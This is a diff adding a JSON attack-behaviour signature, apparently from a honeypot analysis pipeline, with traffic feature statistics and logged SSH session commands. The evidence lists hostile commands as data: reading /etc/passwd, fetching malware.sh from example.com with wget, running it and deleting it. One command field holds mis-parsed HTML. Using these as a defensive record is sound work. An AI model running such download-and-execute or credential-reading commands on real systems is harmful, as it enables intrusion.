@@ -1,0 +1,156 @@
+{
+  "schema_version": "1.0",
+  "generated_at": "2026-11-12T07:03:16.525698+00:00",
+  "signature_count": 1,
+  "signatures": [
+    {
+      "signature_id": "sig-4e22763125d03876",
+      "signature_version": "1.0",
+      "cluster_id": 1,
+      "behaviour_label": "Mixed/Unclassified",
+      "session_count": 5,
+      "support_percentage": 100.0,
+      "feature_profile": {
+        "selected_features": [
+          {
+            "feature": "synack",
+            "mean": 0.0188254,
+            "median": 0.003139,
+            "std": 0.03582661,
+            "min": 0.001545,
+            "max": 0.082876
+          },
+          {
+            "feature": "tcprtt",
+            "mean": 0.0418346,
+            "median": 0.006976,
+            "std": 0.07961455,
+            "min": 0.003433,
+            "max": 0.184169
+          },
+          {
+            "feature": "sload",
+            "mean": 257.04484,
+            "median": 73.8046,
+            "std": 440.21405252,
+            "min": 27.2841,
+            "max": 1041.8983
+          },
+          {
+            "feature": "sbytes",
+            "mean": 163.2,
+            "median": 42.0,
+            "std": 269.89757316,
+            "min": 41.0,
+            "max": 646.0
+          },
+          {
+            "feature": "djit",
+            "mean": 2.7956554,
+            "median": 1.926555,
+            "std": 2.01554552,
+            "min": 0.985831,
+            "max": 5.023865
+          },
+          {
+            "feature": "sjit",
+            "mean": 0.4657852,
+            "median": 0.580004,
+            "std": 0.32171386,
+            "min": 0.0,
+            "max": 0.81064
+          },
+          {
+            "feature": "dinpkt",
+            "mean": 1.3300088,
+            "median": 0.888086,
+            "std": 0.89500848,
+            "min": 0.528419,
+            "max": 2.335662
+          },
+          {
+            "feature": "dur",
+            "mean": 7.344718,
+            "median": 4.960177,
+            "std": 4.37413111,
+            "min": 3.161629,
+            "max": 12.314849
+          }
+        ],
+        "summary": "Features are ranked by cluster-specific relative variability; constant dimensions are excluded when variable dimensions are available."
+      },
+      "command_categories": [
+        "reconnaissance",
+        "file_system",
+        "file_transfer",
+        "networking",
+        "credential_attack",
+        "privilege_escalation",
+        "evasion",
+        "persistence"
+      ],
+      "representative_commands": [
+        "cat /etc/passwd",
+        "exit",
+        "ls -la",
+        "pwd",
+        "uname -a"
+      ],
+      "authentication_profile": {
+        "observed": true,
+        "success_count": 5,
+        "failure_count": 0,
+        "success_rate": 100.0,
+        "notes": "Authentication success/failure observed from session_details.json."
+      },
+      "activity_profile": {
+        "dominant_interpretation": "Mixed/Unclassified",
+        "supporting_sessions": 5,
+        "observed_categories": [
+          "reconnaissance",
+          "file_system",
+          "file_transfer",
+          "networking",
+          "credential_attack",
+          "privilege_escalation",
+          "evasion",
+          "persistence"
+        ],
+        "session_ids": [
+          "8bc90eb81f6a",
+          "6a0b14ea5061",
+          "032b5c63590e",
+          "e8368cd0690d",
+          "5eb1bc4dfe00"
+        ]
+      },
+      "supporting_evidence": [
+        "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 12.314849",
+        "Observed commands: cd /tmp, wget http://example.com/malware.sh; Command categories: file_system, file_transfer, networking, reconnaissance; Authentication success flag: 1; Session duration: 4.444169",
+        "Observed commands: ./malware.sh, <!doctype html><html lang=en><head><meta charset=utf-8><link rel=icon href=data:,><meta name=viewport content=\"width=device-width,initial-scale=1\"><title>Example Domain</title><style>html{color-scheme:light dark;background:light-dark(#eee,#222)}body{font:16px/1.6 system-ui,sans-serif;max-width:26em;margin:auto;padding:25vh 2em 2em;text-align:center}</style></head><body><p>This domain is for use in documentation examples without needing permission. This is not a service; avoid relying on it for testing and monitoring purposes.</p><script src=/s.js></script></body></html>, cd /tmp, exit, rm malware.sh; Command categories: evasion, file_system, file_transfer, networking, persistence, reconnaissance; Authentication success flag: 1; Session duration: 4.960177",
+        "Observed commands: cd /tmp, exit, wget http://example.com/malware.sh; Command categories: file_system, file_transfer, networking, reconnaissance; Authentication success flag: 1; Session duration: 3.161629",
+        "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.842766"
+      ],
+      "limitations": [
+        "Behavioural interpretation is mixed or weakly supported by the available evidence."
+      ],
+      "evidence_strength": {
+        "score": 0.8375,
+        "label": "High",
+        "method": "0.25 + 0.30 * support_ratio + 0.25 * interpretation_consistency + 0.10 * command_evidence + 0.10 * auth_evidence, capped at 1.0"
+      },
+      "confidence": 0.8375,
+      "created_at": "2026-11-12T07:03:16.524702+00:00",
+      "source_files": [
+        "data/processed/dec_results.csv",
+        "data/processed/session_mapping.csv",
+        "data/parsed/session_details.json",
+        "data/processed/model_input.csv",
+        "reports/behaviour_analysis/cluster_summary.csv",
+        "reports/behaviour_analysis/cluster_feature_statistics.csv",
+        "reports/behaviour_analysis/cluster_command_analysis.csv",
+        "reports/behaviour_analysis/session_behaviour_profiles.csv"
+      ]
+    }
+  ]
+}
